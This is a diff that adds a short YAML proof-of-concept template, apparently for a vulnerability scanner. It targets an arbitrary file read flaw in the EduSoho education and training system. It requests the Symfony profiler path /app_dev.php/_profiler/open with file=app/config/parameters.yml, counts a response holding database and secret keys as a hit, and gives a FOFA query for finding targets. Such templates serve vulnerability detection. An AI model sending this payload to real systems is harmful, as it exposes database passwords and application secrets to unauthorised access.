@@ -1,0 +1,22 @@
+id: poc-yaml-edusoho-education-and-training-system-app-devphp-anyfile-read
+info:
+  name: EduSoho 教培系统 app_dev.php 任意读取漏洞
+  severity: critical
+  tags:
+  - 文件读取
+  finger: EduSoho 教培系统
+  fofa: Powered By EduSoho
+requests:
+- method: GET
+  path: /app_dev.php/_profiler/open?file=app/config/parameters.yml
+  expression: 'status_code == 200 &&
+
+    contains(body,"database_driver") &&
+
+    contains(body,"secret") &&
+
+    contains(body,"database_password")
+
+    '
+variables: {}
+transport: http
